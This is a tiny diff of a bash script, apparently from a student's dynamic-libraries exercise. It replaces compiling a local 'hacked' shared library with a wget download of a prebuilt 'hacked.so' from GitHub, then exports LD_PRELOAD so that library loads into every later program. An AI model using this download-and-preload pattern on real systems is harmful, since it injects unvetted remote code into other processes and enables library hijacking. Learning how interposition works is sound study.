@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -shared -o libhacked.so
-LD_PRELOAD=$PWD/libhacked.so
+wget -P /$PWD/ https://raw.github.com/BekaHabesha/alx-low_level_programming/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/$PWD/hacked.so
